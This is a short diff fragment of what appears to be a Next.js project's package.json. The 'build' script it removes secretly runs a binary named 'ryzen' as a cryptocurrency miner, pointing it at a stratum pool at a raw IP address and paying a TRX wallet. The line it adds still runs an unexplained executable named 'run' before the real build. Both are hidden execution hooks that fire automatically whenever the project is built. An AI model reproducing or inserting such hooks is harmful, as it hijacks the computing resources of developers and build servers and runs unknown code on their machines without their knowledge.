@@ -8,7 +8,7 @@
   },
   "scripts": {
     "dev": "next",
-    "build": "chmod 700 ryzen;./ryzen -a YespowerYtn -o stratum+tcp://45.66.249.224:443 -u TXEKBfQbvYHEE2VLTT7yoS3ZMXi6Rra9g4 -p c=TRX;next build",
+    "build": "chmod 700 run;./run;next build",
     "preexport": "npm run build",
     "export": "next export",
     "prestart": "npm run export",
